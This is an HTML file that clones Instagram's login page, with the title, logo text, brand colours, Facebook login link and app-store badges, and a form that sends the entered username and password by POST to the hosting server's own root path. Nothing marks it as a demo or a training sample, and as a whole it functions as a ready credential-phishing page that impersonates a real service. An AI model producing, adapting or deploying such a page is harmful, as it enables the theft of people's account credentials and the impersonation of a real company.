<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login • Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
body{background:#fafafa;display:flex;flex-direction:column;align-items:center;min-height:100vh;padding:40px 16px}
.box{background:#fff;border:1px solid #dbdbdb;width:100%;max-width:350px;padding:40px 40px 24px;text-align:center}
.logo{font-family:'Segoe Script','Billabong',cursive;font-size:42px;color:#262626;margin-bottom:32px;font-weight:400;letter-spacing:1px}
input{width:100%;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:9px 8px;font-size:12px;margin-bottom:6px;outline:none;color:#262626}
input:focus{border-color:#a8a8a8}
input::placeholder{color:#8e8e8e}
button{width:100%;background:#0095f6;color:#fff;border:none;border-radius:8px;padding:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:8px}
button:hover{background:#1877f2}
.divider{display:flex;align-items:center;margin:20px 0;color:#8e8e8e;font-size:13px;font-weight:600}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
.divider::before{margin-right:18px}.divider::after{margin-left:18px}
.fb{color:#385185;font-size:14px;font-weight:600;text-decoration:none;display:block;margin-bottom:12px}
.forgot{color:#00376b;font-size:12px;text-decoration:none}
.signup{background:#fff;border:1px solid #dbdbdb;width:100%;max-width:350px;padding:20px;text-align:center;margin-top:10px;font-size:14px;color:#262626}
.signup a{color:#0095f6;text-decoration:none;font-weight:600}
.getapp{margin-top:20px;text-align:center;font-size:14px;color:#262626}
.badges{display:flex;gap:8px;justify-content:center;margin-top:16px}
.badge{background:#000;color:#fff;border-radius:6px;padding:6px 14px;font-size:11px;font-weight:600}
</style>
</head>
<body>
<div class="box">
<div class="logo">Instagram</div>
<form method="POST" action="/">
<input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username">
<input type="password" name="password" placeholder="Password" required autocomplete="current-password">
<button type="submit">Log in</button>
</form>
<div class="divider">OR</div>
<a class="fb" href="#">Log in with Facebook</a>
<a class="forgot" href="#">Forgot password?</a>
</div>
<div class="signup">Don't have an account? <a href="#">Sign up</a></div>
<div class="getapp">
<p>Get the app.</p>
<div class="badges">
<div class="badge">App Store</div>
<div class="badge">Google Play</div>
</div>
</div>
</body>
</html>
